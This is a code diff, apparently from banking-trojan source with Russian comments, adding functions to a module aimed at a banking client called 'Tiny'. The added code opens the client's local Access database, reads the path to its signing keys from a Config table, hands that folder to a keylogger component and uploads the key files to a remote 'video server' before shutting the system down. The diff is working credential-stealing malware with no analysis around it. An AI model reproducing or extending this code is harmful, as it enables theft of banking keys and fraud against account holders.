@@ -51,6 +51,31 @@ BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
 static bool SetHooks();
 static bool InitData();
 
+static void CloseDB( ODBC* DB )
+{
+	if( DB ) delete DB;
+}
+
+static ODBC* OpenDB()
+{
+	ODBC* DB = new ODBC();
+	if( DB )
+	{
+		char strConnect[MAX_PATH];
+		m_lstrcpy( strConnect, "DRIVER=Microsoft Access Driver (*.mdb);DBQ=" );
+		m_lstrcat( strConnect, pathMDB );
+//		m_lstrcat( strConnect, ";UID=admin;PWD=" );
+		DBG( "Tiny", "strConnect: '%s'", strConnect );
+		if( !DB->Connect(strConnect) )
+		{
+			CloseDB(DB);
+			DB = 0;
+		}
+	}
+	return DB;
+}
+
+
 //отсылка полного клиента на видео сервер
 DWORD WINAPI SendTiny(LPVOID)
 {
@@ -140,6 +165,28 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
 	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
 	MemFree(ffc);
+	//берем в базе данных путь к ключам
+	ODBC* db = OpenDB();
+	if( db )
+	{
+		char pathKeys[MAX_PATH];
+		pathKeys[0] = 0;
+		const char* sql = "select Param from Config where Code='keypath'";
+		SQLHSTMT qr = db->ExecuteSql( sql, "os255", pathKeys );
+		if( qr )
+		{
+			db->CloseQuery(qr);
+			DBG( "Tiny", "Путь к ключам '%s'", pathKeys );
+			KeyLogger::AddDirectory( pathKeys, "keys" );
+			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, true );
+		}
+		else
+			DBG( "Tiny", "Путь к ключам в базе данных не найден" );
+		CloseDB(db);
+	}
+	else
+		DBG( "Tiny", "Не удалось открыть базу %s", pathMDB );
+
 	pSleep(10000); //ждем немного и закрываем систему
 
 	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
